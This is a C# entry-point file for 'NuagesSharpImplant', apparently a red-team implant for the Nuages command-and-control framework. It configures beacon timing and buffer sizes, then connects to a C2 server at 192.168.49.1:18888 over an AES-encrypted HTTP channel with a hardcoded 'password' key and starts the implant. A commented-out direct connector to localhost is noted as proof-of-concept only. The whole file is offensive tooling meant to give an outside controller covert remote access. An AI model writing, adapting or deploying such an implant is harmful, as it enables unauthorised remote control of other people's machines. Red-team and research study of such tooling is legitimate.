﻿using System.Collections.Generic;

namespace NuagesSharpImplant
{
    class Program
    {
        static void Main(string[] args)
        {

            Dictionary<string, string> config = new Dictionary<string, string>();

            config["sleep"] = "1";

            // Buffer size for pipes (file transfers / tcp / interactive)
            config["buffersize"] = "65535";

            // Refreshrate in milliseconds
            config["refreshrate"] = "100";

            // If the Direct connector is used (VERY BAD PRACTICE - Only for POC)
            // DirectConnection connection = new DirectConnection("http://127.0.0.1:3030/implant/", 65536, 100);

            // If the HTTPAES256 Handler is used:
            HTTPAES256Connection connection = new HTTPAES256Connection("http://192.168.49.1:18888", "password", 65536, 100);

            NuagesC2Connector connector = new NuagesC2Connector(connection);

            NuagesC2Implant implant = new NuagesC2Implant(config, connector);

            implant.Start();
        }
    }
}
